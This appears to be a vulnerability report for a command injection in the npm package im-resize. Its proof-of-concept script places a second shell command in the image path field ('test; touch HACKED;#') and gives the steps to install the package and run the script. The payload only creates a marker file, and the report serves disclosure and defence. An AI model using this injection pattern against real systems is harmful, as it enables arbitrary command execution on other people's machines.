# Overview

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var resize = require("im-resize");

var image = {
  path: "test; touch HACKED;#",
  width: 5184,
  height: 2623,
};

var output = {
  versions: [
    {
      suffix: "-thumb",
      maxHeight: 150,
      maxWidth: 150,
      aspect: "3:2",
    },
    {
      suffix: "-square",
      maxWidth: 200,
      aspect: "1:1",
    },
  ],
};

resize(image, output, function (error) {
  console.log();
});
```

1. Check there aren't files called `HACKED`
1. Execute the following commands in another terminal:

```bash
npm i im-resize # Install affected module
node poc.js #  Run the PoC
```

1. Recheck the files: now `HACKED` has been created :)
